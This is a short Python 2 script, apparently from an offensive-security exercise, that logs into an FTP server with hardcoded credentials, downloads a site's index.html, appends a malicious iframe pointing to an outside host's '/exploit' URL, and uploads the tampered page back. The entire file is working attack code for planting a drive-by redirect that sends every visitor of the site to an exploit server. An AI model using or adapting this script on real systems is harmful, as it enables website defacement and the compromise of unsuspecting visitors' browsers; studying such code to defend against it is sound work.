import ftplib


def injectPage(ftp, page, redirect):
	f = open(page + '.tmp', 'w') #opens temporary version of the webpage
	ftp.retrlines('RETR ' + page, f.write)
	print '[+] Downloaded page: ' + page
	f.write(redirect) #writes the redirect script to the page
	f.close()

	print '[+] Inject malicious iFrame on: ' + page
	ftp.storlines('STOR ' + page, open(page + '.tmp',))
	print '[+] Uploaded injected page: ' + page

host = '192.168.0.108'
username = 'joseph'
password = 'poop'
ftp = ftplib.FTP(host)
ftp.login(username, password)
redirect = '<iframe = src= "http://websitename.com:8080/exploit"></iframe>'

injectPage(ftp, 'index.html', redirect)
